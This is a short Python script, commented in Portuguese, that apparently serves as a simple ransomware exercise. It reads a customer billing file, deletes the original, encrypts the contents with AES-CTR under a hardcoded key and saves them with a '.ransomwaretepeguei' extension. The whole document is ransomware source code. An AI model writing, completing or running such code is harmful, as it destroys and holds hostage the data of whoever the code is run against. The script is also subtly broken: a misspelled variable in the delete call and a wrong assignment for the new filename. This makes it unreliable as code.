import os
import pyaes

## Abrir o arquivo para ser criptografado, aqui ele abre, lê e fecha.

file_name = "clientes_cobranca.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Remove o arquivo

os.remove(fiel_name)

## Cria a chave de criptografia

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## Criar um novo arquivo com uma nova extenção para mostrar que foi hackeado.

new_file = file_name = ".ransomwaretepeguei"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
